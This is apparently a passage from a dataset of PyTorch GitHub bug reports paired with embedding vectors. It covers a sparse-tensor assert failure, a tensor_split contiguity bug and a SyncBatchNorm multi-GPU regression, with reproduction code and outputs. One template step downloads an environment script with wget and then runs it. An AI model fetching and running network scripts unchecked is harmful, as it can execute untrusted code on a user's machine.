 -1.32559717e-01  3.67976636e-01 -2.76759088e-01  8.28944594e-02
 -9.05005410e-02 -2.30750561e-01 -5.81794500e-01  1.04294948e-01
  2.89336964e-02  4.59011793e-02 -5.67540228e-01  2.14847177e-01
 -7.41239190e-02 -8.92501324e-02  2.43728846e-01  1.87267274e-01
 -1.97323024e-01 -2.10179240e-02  2.16226839e-02 -2.34802991e-01
 -2.86838055e-01  3.65790814e-01  1.61781877e-01 -1.77612722e-01
  2.39041418e-01  2.91189611e-01  2.75948197e-01  2.24436633e-03
 -2.09737077e-01  5.51814027e-02  1.58195540e-01  2.38283753e-01
  2.53392518e-01 -2.94230223e-01 -1.70057014e-01  1.57028675e-01
 -5.89809179e-01 -5.80394939e-02  1.71693370e-01  3.65529656e-01
  1.79450363e-01  1.41577289e-01  9.59128439e-02  6.82497978e-01
 -2.44624048e-01 -2.67616272e-01  3.98831703e-02 -6.63886815e-02
  3.01761389e-01 -2.39145100e-01 -1.91056758e-01 -7.02567816e-01
  3.18423182e-01 -1.02962859e-01 -2.50903547e-01  3.13979238e-01
 -1.11783445e-01 -8.64805058e-02  1.56095326e-01 -2.16000140e-01
  7.17341900e-02 -1.47924691e-01  8.54289234e-02  6.13429248e-02
  2.99798191e-01 -3.61683846e-01 -1.59652568e-02  3.06486994e-01]"
Multiplication of scalar COO sparse tensors leads to internal assert failure module: sparse triaged module: assert failure,"## ðŸ› Bug

As in the title.

## To Reproduce

```python
>>> import torch
>>> t = torch.tensor(1).to_sparse()
>>> t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([1]),
       size=(), nnz=1, layout=torch.sparse_coo)
>>> t * t
Traceback (most recent call last):
  File ""<stdin>"", line 1, in <module>
RuntimeError: r.is_sparse()INTERNAL ASSERT FAILED at ""../aten/src/ATen/native/sparse/SparseTensorMath.cpp"":54, please report a bug to PyTorch. 
```

## Expected behavior

No internal assert failure.

In addition, the multiplication should succeed:
```python
>>> t * t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([1]),
       size=(), nnz=1, layout=torch.sparse_coo)
```

## Environment

- PyTorch Version (e.g., 1.0): 1.10.0a0

## Additional context

Notice that the addition of scalar COO tensors works correctly
```python
>>> t + t
tensor(indices=tensor([], size=(0, 1)),
       values=tensor([2]),
       size=(), nnz=1, layout=torch.sparse_coo)
```


cc @nikitaved @pearu @cpuhrsch @IvanYashchuk",True,"[-4.92551833e-01 -2.93349117e-01 -2.78397441e-01  1.86843425e-01
 -1.38529509e-01 -2.91121185e-01  1.84610456e-01 -2.47362852e-02
 -4.86160576e-01 -2.60411859e-01  1.69706941e-01 -1.08697951e-01
 -2.64309376e-01  2.54072249e-01 -1.73995078e-01  7.14471862e-02
  5.79521731e-02 -1.38862476e-01 -1.53969955e-02 -1.40513092e-01
  1.89580053e-01 -2.07313269e-01 -3.06799412e-01  2.32586101e-01
 -1.16519913e-01 -4.17801216e-02 -1.94996864e-01 -3.69292572e-02
  2.23123610e-01 -8.21433365e-02  8.26298892e-02 -2.30551194e-02
 -4.44630206e-01  1.12755649e-01 -1.65897518e-01  3.82662773e-01
 -2.95180976e-01 -7.82713667e-02  5.60768172e-02  2.70179100e-02
 -1.03966750e-01  1.60256177e-01  2.35286877e-02 -5.34232259e-02
 -5.45766167e-02 -8.18186998e-02  3.08838338e-01  2.43036181e-01
 -1.40569270e-01 -3.28001916e-01 -4.58653234e-02  2.56011724e-01
 -3.14487070e-01 -6.17451191e-01  2.44635548e-02 -2.97230780e-01
  1.51479602e-01 -5.21153323e-02 -1.23270810e-01 -5.07767737e-01
  1.51237071e-01  4.32107225e-02 -8.46656710e-02  7.79297203e-02
  8.12440366e-02  7.44168311e-02  3.62061232e-01  4.26242314e-02
  5.70334554e-01  2.92331457e-01  4.74505603e-01  1.28923595e-01
 -2.40581185e-01  1.41818181e-01 -5.42247668e-04  1.83876902e-01
 -8.50693807e-02  2.01463073e-01  2.84432501e-01 -2.49325000e-02
  1.59326568e-01  1.85426697e-02 -5.72296828e-02 -3.48965108e-01
  5.13949990e-02  5.17060682e-02  3.09880257e-01  2.29227230e-01
  6.14102483e-01 -3.45200270e-01  3.87975365e-01 -7.82060251e-03
 -4.18260336e-01  1.18581638e-01  1.11312702e-01 -6.20116070e-02
  9.07267481e-02  1.44235730e-01 -1.85522228e-01 -6.34826198e-02
 -2.71777838e-01 -3.07013750e-01 -1.79423362e-01  1.96648985e-01
  3.58503386e-02  1.82098120e-01  1.04916595e-01  9.64727551e-02
  1.51592582e-01  1.52860492e-01 -1.74031295e-02  1.34368809e-02
  3.21704268e-01  1.29615545e-01  5.52701093e-02 -3.07859182e-01
  1.36439085e-01  4.10687700e-02 -1.06239408e-01  4.81814414e-01
  1.19992653e-02  8.21468756e-02  2.01427728e-01  4.08841074e-01
  3.31700623e-01  1.32616103e-01 -1.62948191e-01 -1.22845516e-01
  3.27422082e-01  3.36136162e-01  4.84440066e-02  2.36795992e-02
 -2.56361127e-01  7.49123767e-02  2.96700418e-01 -2.78410800e-02
 -4.98449177e-01 -6.16912022e-02 -2.99819589e-01  4.25617099e-02
 -2.30956614e-01 -1.93738937e-01 -2.61501729e-01 -2.57846177e-01
  3.86156708e-01  9.52076614e-02 -2.21252859e-01  5.90974092e-02
 -5.65089248e-02  1.44597113e-01 -2.12253839e-01  1.86069846e-01
 -1.15392208e-01  9.45621282e-02 -1.49379134e-01  2.23532557e-01
  4.14369032e-02 -1.41345859e-01  1.35017067e-01 -4.90427077e-01
  2.40954787e-01  4.05141950e-01  2.83150047e-01 -1.41331360e-01
  9.71989781e-02  1.89821750e-01 -2.66421318e-01 -6.69133961e-02
 -1.91348374e-01  2.19229028e-01 -5.85219041e-02 -2.36627698e-01
 -3.76066476e-01  4.89064530e-02  3.34963202e-01 -1.11087352e-01
 -4.20030951e-02 -6.89979672e-01 -1.85422629e-01  2.89581895e-01
  1.16999716e-01  1.10981598e-01  1.89650774e-01 -6.91306442e-02
 -1.79313570e-01  8.06014538e-02  3.33240092e-01 -1.34545816e-02
 -1.29273683e-01 -4.83409390e-02 -2.94027954e-01 -4.12308604e-01
  2.15755194e-01 -1.48084551e-01 -1.26477629e-01  9.53480452e-02
  1.17612228e-01 -2.06178367e-01  2.10864693e-02  1.40782416e-01
 -3.82471025e-01 -4.26885188e-01  8.26548412e-02 -3.83212827e-02
  3.70365441e-01 -2.68917561e-01  6.40312675e-03 -4.79595363e-01
 -2.42559254e-01  1.13523409e-01 -1.44220069e-01 -2.41087615e-01
 -2.08185047e-01 -3.54745090e-02 -6.38736635e-02 -9.58137661e-02
 -6.96606338e-02 -6.50585964e-02 -9.50892717e-02  1.49030760e-01
  1.66639507e-01 -3.54814351e-01 -1.20364182e-01 -2.10729659e-01
 -6.96539655e-02 -3.75722080e-01 -2.04319119e-01 -1.50637329e-01
  2.72363368e-02  1.18908817e-02 -4.08005193e-02 -1.48394734e-01
  1.55749142e-01 -3.91658023e-02  8.88051763e-02  3.00241970e-02
 -1.49736583e-01 -1.61742240e-01  4.32626903e-02  2.82828569e-01
 -2.35893145e-01  1.71306636e-02 -3.85531690e-03 -7.09426552e-02
  3.19476835e-02  2.53840536e-01 -2.60552227e-01 -1.11511409e-01
 -2.14083254e-01  2.19880611e-01 -9.62486267e-02  2.25672007e-01
  3.42654362e-02  1.51039124e-01  3.48242819e-01  6.91713169e-02
  2.10813820e-01  7.82390982e-02  7.85537213e-02  1.89101934e-01
  2.21274927e-01  4.28067684e-01  6.73437417e-02  3.84832829e-01
  4.76894639e-02  2.72760808e-01  3.63866463e-02  2.76207626e-01
  1.42971843e-01 -1.70919418e-01  1.98783740e-01 -1.35992661e-01
  1.81219071e-01 -3.96035373e-01  5.04665785e-02 -3.88969660e-01
  3.82366627e-01  1.46068767e-01 -2.99242914e-01 -1.00922145e-01
 -1.80068277e-02  2.66125053e-01 -2.51425028e-01  2.00951040e-01
  3.30064595e-02 -3.06489170e-01 -1.18681163e-01 -9.30054486e-03
 -1.15177214e-01 -1.59392089e-01 -3.95318151e-01  2.23492801e-01
  2.86732197e-01 -1.91313729e-01 -3.19920003e-01  1.41725957e-01
  3.02211791e-01 -8.30864906e-02 -6.99323565e-02  9.99952406e-02
 -1.17575794e-01  6.57360405e-02  2.41699755e-01 -3.18734556e-01
  8.17229301e-02 -1.41079396e-01  4.87056673e-01  3.99236381e-02
  5.50347209e-01 -1.48331791e-01  4.08554405e-01  4.08917964e-02
  2.39659119e-02  4.50731844e-01 -3.04543916e-02  4.48331982e-03
  1.19820125e-01  5.78131437e-01  4.26482469e-01  1.12721853e-01
  1.32728949e-01 -1.35147497e-01 -1.62762329e-01 -1.28298581e-01
  8.12456757e-03  1.77543491e-01 -3.01568024e-02 -4.40196931e-01
  5.19420393e-02  6.77751098e-03 -2.58607179e-01 -3.72467756e-01
 -8.37231353e-02 -1.50312662e-01  1.79300800e-01 -2.01908708e-01
 -2.95181066e-01  3.91582459e-01  2.23491285e-02 -1.81894690e-01
 -1.17597997e-01 -3.11288506e-01 -9.58978236e-02 -3.96190345e-01
 -8.97115320e-02 -2.10118175e-01  1.98579073e-01  3.75461765e-03
 -9.15593952e-02  8.51100683e-02 -6.83929622e-02  9.31432471e-02
 -7.23875165e-02  1.88567072e-01  3.00732940e-01  5.42370558e-01
  8.37745965e-02  8.30074921e-02 -2.09839255e-01  4.56232518e-01
 -1.80847704e-01 -4.56160121e-02 -2.30342209e-01 -7.94260204e-02
  2.69207627e-01 -9.38033909e-02  7.60246664e-02 -3.72974873e-01
  1.93145931e-01  2.15199471e-01 -6.17668033e-04  3.85258645e-01
 -1.98868960e-01  5.81053853e-01  5.19399703e-01 -3.12319934e-01
 -1.12134762e-01  9.11840722e-02  2.32280582e-01 -2.56042808e-01
  3.30826581e-01  1.75885737e-01  1.00827560e-01 -5.25882095e-02]"
tensor_split does not handle non-contiguous indices high priority triaged module: memory format,"## ðŸ› Bug

torch.tensor_split does not produce the same outputs for non-contiguous tensors as for contiguous, see repro below.

## To Reproduce

Steps to reproduce the bug:

```python
inner_indices = torch.tensor([[564,   0],
        [564,   0],
        [564,   0],
        [564,   1],
        [565,   1],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   0],
        [566,   1],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   0],
        [567,   1],
        [568,   0],
        [568,   0],
        [568,   0],
        [568,   1],
        [569,   0],
        [569,   0],
        [569,   0],
        [569,   1],
        [570,   0],
        [570,   0],
        [570,   0],
        [570,   0],
        [570,   0]])
data = torch.tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32)
for u, v in zip(torch.tensor_split(data, inner_indices[:, 1]),
                torch.tensor_split(data, inner_indices[:, 1].contiguous())):
    if u.shape != v.shape:
        print(u, v)
```

Output:
```
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([4], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
tensor([4, 4, 4, 4, 4, 4], dtype=torch.int32) tensor([], dtype=torch.int32)
```

## Expected behavior

Output should be the same for contiguous and non-contiguous tensors.

## Environment

Tested in stable 1.9 and nightly '1.10.0.dev20210814+cpu'.

cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @VitalyFedyunin @jamesr66a @ppwwyyxx",True,"[-1.72037795e-01 -3.55471432e-01 -2.24935293e-01 -1.09678082e-01
 -2.71484330e-02 -2.94737667e-01  4.94048558e-02 -6.77406192e-02
 -2.68814802e-01 -1.73517942e-01 -2.76158713e-02  2.14778617e-01
 -2.24138647e-01  4.00574327e-01  1.98831931e-02  7.13912845e-02
 -4.07225817e-01  4.66545485e-02 -2.99900174e-01 -1.31562144e-01
  4.18325007e-01 -2.87124842e-01 -5.14747262e-01  1.97076559e-01
  1.83941647e-01  2.00486392e-01  2.46256039e-01 -1.13770649e-01
  1.24839872e-01  6.05717208e-03  2.71322012e-01  7.40452763e-03
 -2.62552589e-01 -3.09113450e-02 -9.89506841e-02  3.04128766e-01
 -5.89941144e-01 -8.19294900e-02 -5.32337185e-03  3.79030891e-02
  2.55382895e-01  1.55689627e-01  1.07645154e-01 -8.33326727e-02
  6.05952069e-02  1.07412105e-02 -2.67143995e-02  1.41930103e-01
 -1.21447351e-02 -5.64180017e-02 -1.24405622e-01  4.09968078e-01
 -3.82894188e-01 -1.07225113e-01 -4.59579341e-02 -2.84522831e-01
 -9.73847061e-02 -4.53674227e-01 -1.95517726e-02 -4.02300477e-01
  9.27042514e-02  3.34424555e-01 -1.24650262e-03  9.27267671e-02
  1.08081564e-01 -4.55616936e-02  4.70324695e-01 -1.32218122e-01
  4.72069383e-01  3.14377546e-01  2.90076464e-01  6.46541342e-02
 -3.46217215e-01  4.18655649e-02 -1.37591690e-01  3.53612304e-01
 -1.98999554e-01  4.24098432e-01  5.86946383e-02 -1.02152064e-01
 -1.93353534e-01 -7.89527595e-03  1.68543771e-01 -2.82322705e-01
  1.24534266e-02  1.30695134e-01  2.58327901e-01  1.03513524e-01
  2.08554462e-01 -1.40665337e-01  5.70189953e-01  1.09495111e-01
 -2.82760292e-01 -8.73003304e-02  8.38015378e-02  4.59942035e-03
  1.86097592e-01  4.26131301e-02 -1.78826943e-01 -1.82431281e-01
 -3.95204723e-01 -2.48011827e-01 -3.90736341e-01  1.37388229e-01
  4.46776561e-02  4.26628053e-01  8.38062316e-02 -1.25041366e-01
  1.46212280e-01  1.55489519e-02  5.14030345e-02 -7.26711601e-02
  2.73344249e-01  7.12107867e-02  5.19083589e-02 -1.84916168e-01
  1.93632305e-01  3.06593418e-01  2.79660225e-01  5.07358193e-01
 -2.50180483e-01  4.50560488e-02  6.19666539e-02  6.24556363e-01
  2.12401241e-01  2.92448819e-01  2.06076846e-01 -6.55461177e-02
  2.06729800e-01 -1.14994720e-02  3.00349981e-01 -1.60843253e-01
 -3.25577557e-01  1.34225279e-01  2.68308688e-02  3.85787226e-02
 -2.04992205e-01 -5.04999161e-02 -3.56914282e-01  1.51455432e-01
 -3.37135270e-02  6.68651089e-02 -3.49500090e-01 -2.12554321e-01
  4.33633000e-01  1.86542004e-01 -2.98666656e-01 -9.29395109e-02
 -1.60641044e-01  4.12629932e-01 -7.84854293e-02 -2.89310385e-02
 -1.67283654e-01  3.41825821e-02 -7.34737702e-03  7.73788765e-02
 -8.64879638e-02  4.73945513e-02 -1.05846241e-01 -3.82287294e-01
  7.25491494e-02  4.42205787e-01 -1.40055984e-01  9.23577249e-02
  2.45359212e-01  3.17415833e-01 -1.55862495e-01 -2.65978962e-01
 -2.60730296e-01  1.77235425e-01  6.61561117e-02 -7.07236528e-02
 -3.98398042e-01  8.89135897e-02  1.12146012e-01  1.56150907e-02
 -2.59146709e-02 -6.46515369e-01 -8.20699409e-02  9.18955132e-02
  1.30327106e-01  4.50174659e-02  3.42574008e-02 -5.26655018e-02
  1.70491576e-01 -9.41531658e-02  2.66668379e-01 -6.22209758e-02
 -9.05621871e-02 -1.19016990e-01  3.91877107e-02 -3.64973933e-01
  2.47330695e-01  1.06626302e-01  8.96175131e-02  3.60967666e-02
  2.86949694e-01 -1.12955481e-01 -7.06523955e-02  1.82345882e-03
  7.42253065e-02 -3.90262812e-01 -8.43227357e-02  3.48803550e-02
  1.02443248e-01 -5.24911046e-01 -1.86982840e-01 -4.01740134e-01
 -2.60838091e-01  1.27949446e-01  3.81753407e-03 -3.88940394e-01
 -1.06838256e-01 -1.82448268e-01 -1.58436388e-01 -1.59929544e-01
 -6.17831126e-02 -2.20103741e-01 -4.04423416e-01  1.78691939e-01
  4.94685531e-01  2.65748296e-02 -5.45133054e-02 -2.05339417e-01
 -2.25367472e-01 -2.14685112e-01 -2.04964951e-02 -2.54721105e-01
 -1.35348946e-01 -1.40698496e-02 -1.62498131e-02 -1.72210991e-01
  1.43208802e-02  3.92704457e-01 -6.96419459e-03  6.04285710e-02
 -2.68821642e-02 -1.27335489e-01 -1.27039403e-01  1.99274689e-01
 -1.82808787e-02 -7.37717375e-02  9.72181261e-02 -5.87951317e-02
 -2.43755490e-01  4.93309557e-01  2.84918789e-02 -2.10491754e-03
 -2.95362502e-01  3.25170234e-02  4.18329872e-02 -1.09843530e-01
  4.15373772e-01  3.45652271e-03  3.04520071e-01 -3.25682342e-01
  2.64071941e-01  1.28042370e-01  2.06947416e-01 -4.20063846e-02
  1.84295714e-01  1.28426552e-01 -5.30610885e-03  4.21620399e-01
  9.78584737e-02  9.03924182e-02 -2.44509459e-01  4.96120512e-01
  3.66608292e-01 -1.66230917e-01 -9.72114727e-02  2.08778292e-01
  1.58745036e-01 -1.49165109e-01 -2.09514961e-01 -3.90058637e-01
  3.41545790e-02  3.59096676e-01 -1.36200100e-01 -1.43353328e-01
  2.54629478e-02  2.63258934e-01 -1.14814840e-01  1.96282059e-01
 -1.28218293e-01 -1.78861886e-01  6.72332495e-02 -4.74450141e-02
  2.16307696e-02 -8.73625576e-02 -3.72711062e-01 -2.68595144e-02
  4.02941346e-01 -1.19603805e-01 -1.85528308e-01  4.14829761e-01
  2.80811459e-01 -2.38022581e-01  8.10129941e-02  3.87687415e-01
  1.23893574e-01  2.33660378e-02  8.28237981e-02 -5.76474741e-02
 -2.12335140e-01 -9.87494513e-02  1.76442683e-01  8.33674520e-02
 -3.99487503e-02 -2.89493561e-01  3.52935225e-01 -1.86250165e-01
  6.90540224e-02  4.77366857e-02 -1.60701364e-01 -2.07213871e-02
  1.26847610e-01  5.48575401e-01  2.56888747e-01  8.75739753e-02
 -2.86766179e-02  1.07067898e-02 -2.33902991e-01  1.95511431e-01
 -1.51391923e-01 -4.64997105e-02 -4.95398045e-02 -1.37762189e-01
 -2.36501452e-04  1.88938975e-01 -1.66736692e-02 -3.30782056e-01
 -1.46882325e-01  1.63852274e-01 -1.48112327e-01 -4.07458514e-01
 -3.95060331e-01  2.65205741e-01 -1.70893185e-02 -2.91532516e-01
  4.87814173e-02 -2.13221997e-01  1.08214870e-01 -3.09171438e-01
  8.42168182e-02 -3.48636001e-01  1.23619318e-01  9.87159386e-02
  2.42045596e-02 -6.62894696e-02 -1.58727378e-01 -8.00145566e-02
  8.61426741e-02  3.41989279e-01  3.36486965e-01  3.94956946e-01
 -5.84084839e-02  1.88352793e-01  3.16934995e-02  1.70896918e-01
 -1.63733259e-01  2.67207995e-02 -2.88581848e-01  1.40493006e-01
  3.27885926e-01 -3.22865963e-01  1.12020373e-02  3.22022587e-02
  2.41986245e-01  3.12925607e-01 -1.02365442e-01  3.86233568e-01
 -1.91282947e-03  2.79091448e-01  3.26649487e-01 -4.14826006e-01
 -4.89979267e-01  3.37094337e-01  5.79829291e-02 -3.49535584e-01
  2.24890128e-01 -7.62125989e-03 -1.59848750e-01  1.19136013e-02]"
BatchNorm2d + SyncBatchNorm incorrect multi gpu behaviour in 1.10.0 (tested working in 1.8.0) module: nn triaged,"## ðŸ› Bug

SyncBatchNorm layers in torch 1.10.0 give different outputs on 2 gpus vs the equivalent BatchNorm layer on a single gpu. This wasn't a problem in torch 1.8.0

## To Reproduce
This code is based on the [PyTorch DDP demo](https://pytorch.org/tutorials/intermediate/ddp_tutorial.html) but the model consists only of a `BatchNorm2d` layer.

```python
import os
import torch
import torch.distributed as dist
import torch.nn as nn
import torch.multiprocessing as mp

from torch.nn.parallel import DistributedDataParallel as DDP
import argparse


def setup(rank, world_size):
    torch.manual_seed(0)
    os.environ[""MASTER_ADDR""] = ""localhost""
    os.environ[""MASTER_PORT""] = ""12355""

    # iniialize the process group
    dist.init_process_group(""gloo"", rank=rank, world_size=world_size)


def cleanup():
    dist.destroy_process_group()


class ToyModel(nn.Module):
    def __init__(self, num_features=10):
        super().__init__()
        self.bn = nn.BatchNorm2d(num_features=num_features)

    def forward(self, x):
        x = x.permute(0, 2, 1, 3)
        x = self.bn(x)
        x = x.permute(0, 2, 1, 3)
        return x


def demo_basic(rank, world_size, convert_sync_batchnorm):
    print(f""Running basic DDP example on rank {rank}."")
    setup(rank, world_size)

    # create model and move it to GPU with id rank
    model = ToyModel(num_features=10)
    # create model and move it to GPU with id rank
    if world_size > 1 and convert_sync_batchnorm:
        print(""Converting BatchNorm to SyncBatchNorm"")
        model = torch.nn.SyncBatchNorm.convert_sync_batchnorm(model)

    model = model.to(rank)
    if world_size > 1:
        ddp_model = DDP(model, device_ids=[rank])
        model = ddp_model

    inputs = torch.randn(2, 2, 10, 1).to(rank)
    print(f""{rank=}, {inputs[0, 0].squeeze()=}"")
    outputs = model(inputs)
    print(f""{rank=}, {outputs[0, 0].squeeze()=}"")

    cleanup()


def run_demo(demo_fn, world_size, convert_bn):
    if world_size > 1:
        mp.spawn(demo_fn, args=(world_size, convert_bn), nprocs=world_size, join=True)
    else:
        demo_fn(0, world_size, convert_bn)


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser()
    parser.add_argument(""--n_gpus"", default=2, type=int, help=""Number of gpus"")
    parser.add_argument(
        ""--convert_bn"",
        action=""store_true"",
        default=False,
        help=""Whether to convert BatchNorm layers to SyncBatchNorm"",
    )

    args = parser.parse_args()

    print(f""{torch.__version__=}"")
    run_demo(demo_basic, args.n_gpus, args.convert_bn)
```

### Torch 1.10.0a0+git63955b3

#### 1 - 2 gpus, convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2 --convert_bn
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
Converting BatchNorm to SyncBatchNorm
Converting BatchNorm to SyncBatchNorm
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7058,  0.7740,  0.1321,  0.6478,  0.2026, -0.1025,  1.0656,
        -1.3900,  0.9416], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7058,  0.7740,  0.1321,  0.6478,  0.2026, -0.1025,  1.0656,
        -1.3900,  0.9416], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 2 - 2 gpus, do not convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 3 - 1 gpu
```
python3 ddp_demo.py --n_gpus 1
torch.__version__='1.10.0a0+git63955b3'
Running basic DDP example on rank 0.
False
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

1 != 2 âŒ
2 == 3 âœ…

### Torch 1.8.0a0+618cf40

#### 1 - 2 gpus, convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2 --convert_bn
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
Converting BatchNorm to SyncBatchNorm
Converting BatchNorm to SyncBatchNorm
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
```

#### 2 - 2 gpus, do not convert to `SyncBatchNorm`
```
python3 ddp_demo.py --n_gpus 2
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
Running basic DDP example on rank 1.
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=1, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:1')
rank=1, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:1', grad_fn=<SqueezeBackward0>)
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

#### 3 - 1 gpu
```
python3 ddp_demo.py --n_gpus 1
torch.__version__='1.8.0a0+618cf40'
Running basic DDP example on rank 0.
rank=0, inputs[0, 0].squeeze()=tensor([-1.1258, -1.1524, -0.2506, -0.4339,  0.8487,  0.6920, -0.3160, -2.1152,
         0.3223, -1.2633], device='cuda:0')
rank=0, outputs[0, 0].squeeze()=tensor([-1.6701, -0.7582, -0.7058, -1.2356,  0.7740,  1.4852,  0.1321, -1.1821,
         0.6478, -1.1941], device='cuda:0', grad_fn=<SqueezeBackward0>)
```

1 == 2 == 3 âœ…

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

## Expected behavior

I expect the behaviour in torch 1.10.0 to mirror that in 1.8.0 where options 1, 2 and 3 all produce the same output.

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py
```

### Torch 1.10.0a0+git63955b3 Env info
```bash
Collecting environment information...
PyTorch version: 1.10.0a0+git63955b3
Is debug build: False
CUDA used to build PyTorch: 11.2
ROCM used to build PyTorch: N/A

OS: Ubuntu 18.04.5 LTS (x86_64)
GCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
Clang version: Could not collect
CMake version: version 3.21.1
Libc version: glibc-2.27

Python version: 3.8.11 (default, Jul  3 2021, 17:53:42)  [GCC 7.5.0] (64-bit runtime)
Python platform: Linux-5.4.0-65-generic-x86_64-with-glibc2.27
Is CUDA available: False
CUDA runtime version: 11.2.152
GPU models and configuration: Could not collect
Nvidia driver version: Could not collect
cuDNN version: Probably one of the following:
/usr/lib/x86_64-linux-gnu/libcudnn.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_adv_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_cnn_train.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_infer.so.8.1.1
/usr/lib/x86_64-linux-gnu/libcudnn_ops_train.so.8.1.1
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.21.1
[pip3] pytorch-memlab==0.2.3
